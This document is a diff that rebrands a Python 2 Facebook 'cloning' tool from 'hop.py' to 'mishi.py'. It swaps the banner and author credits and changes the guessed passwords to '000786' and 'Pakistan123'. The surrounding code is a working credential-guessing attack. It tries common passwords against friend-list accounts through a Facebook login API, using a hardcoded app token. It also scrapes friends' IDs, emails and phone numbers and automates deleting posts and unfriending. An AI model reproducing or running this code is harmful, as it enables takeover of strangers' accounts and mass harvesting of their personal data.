@@ -13,7 +13,7 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 hop.py')
+    os.system('python2 mishi.py')
 
 #Browser Setting
 reload(sys)
@@ -21,6 +21,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
 br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def exit():
@@ -58,21 +59,19 @@ def hopss(z):
 		time.sleep(0.1)
 ##### LOGO #####
 banner = """
-            _______    _______ 
-|\     /|  (  ___  )  (  ____ )
-| )   ( |  | (   ) |  | (    )|
-| (___) |  | |   | |  | (____)|
-|  ___  |  | |   | |  |  _____)
-| (   ) |  | |   | |  | (      
-| )   ( |  | (___) |  | )      
-|/     \|  (_______)  |/ 
+  __  __ _____  _____ _    _ _____ 
+ |  \/  |_   _|/ ____| |  | |_   _|
+ | \  / | | | | (___ | |__| | | |  
+ | |\/| | | |  \___ \|  __  | | |  
+ | |  | |_| |_ ____) | |  | |_| |_ 
+ |_|  |_|_____|_____/|_|  |_|_____| 
                                  
 -----------------------------------------------
 
-➣ Coder   : Muhammad Hamza
-➣ Github  : https://github.com/Hamzahash
-➣ Facebook: Muhammad Hamza
-➣ Youtube : HOP Anonymous
+➣ Coder   : MISHAL KHAN MISHI
+➣ Github  : https://github.com/MISHI
+➣ Facebook: MISHAL KHAN MISHI
+➣ Youtube : JAM SHAHRUKH TECHNICAL
 
 -----------------------------------------------"""
 # titik #
@@ -102,7 +101,7 @@ def menu():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -113,11 +112,11 @@ def menu():
 		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	except requests.exceptions.ConnectionError:
 		print"[!] No Connection"
 		time.sleep(1)
-		('python2 hop.py')
+		('python2 mishi.py')
 	os.system("clear")
 	print banner
 	print "|[✓] Name: "+name
@@ -127,7 +126,7 @@ def menu():
 	print "[2] Clone With Pass Choice."
 	print "[3] Grabbing Tools."
 	print "[4] Auto Del Tools."
-	print "[5] Update HOP Tool."
+	print "[5] Update MISHI Tool."
 	print "[6] Follow Me On Facebook."
 	print "[7] Logout"
 	print ('                  ')
@@ -163,14 +162,14 @@ def men():
 		hamza('[✓] Tool Has Been Update Successfully')
 		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
 		time.sleep(3)
-		os.hamza('python2 hop.py')
+		os.hamza('python2 mishi.py')
 	elif rana =="6":
-		os.system('xdg-open https://www.facebook.com/muhammad.hamza1626')
+		os.system('xdg-open https://www.facebook.com/tahreem.khan.507679')
 		menu()
 	elif rana =="7":
 		os.system('rm -rf login.txt')
 		hamza('[✓] Logged Out Successfully')
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	else:
 		print "[!] Wrong Input"
 		men()
@@ -185,7 +184,7 @@ def crack():
 		print"Token invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	os.system('clear')
 	print banner
 	print "[1] Clone From Friendlist."
@@ -334,7 +333,7 @@ def crack_menu():
 													crt.close()
 													checkpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '1122'
+													pass6 = '000786'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
@@ -348,7 +347,7 @@ def crack_menu():
 															crt.close()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = b['last_name'] + '786'
+															pass7 = 'Pakistan123'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
@@ -393,7 +392,7 @@ def grab():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	os.system('clear')
 	print banner
 	print "[1] Extract Numeric IDs From Public ID."
@@ -432,7 +431,7 @@ def idfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		('python2 hop.py')
+		('python2 mishi.py')
 	try:
 		os.mkdir('save')
 	except OSError:
@@ -491,7 +490,7 @@ def emailfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	try:
 		os.mkdir('save')
 	except OSError:
@@ -558,7 +557,7 @@ def numberfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	try:
 		os.mkdir('save')
 	except OSError:
@@ -623,7 +622,7 @@ def bot():
 		print"[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	os.system('clear')
 	print banner
 	print "[1] Auto Delete Posts."
@@ -664,7 +663,7 @@ def deletepost():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	os.system('clear')
 	print banner
 	print("[✓] Account Name : "+nama)
@@ -701,7 +700,7 @@ def accept():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	os.system('clear')
 	print banner
 	limit = raw_input("[+] Enter Limit To Accept Requests : ")
@@ -734,7 +733,7 @@ def unfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 hop.py')
+		os.system('python2 mishi.py')
 	os.system('clear')
 	print banner
 	hamza('[✓] The Process Has Been Started.')
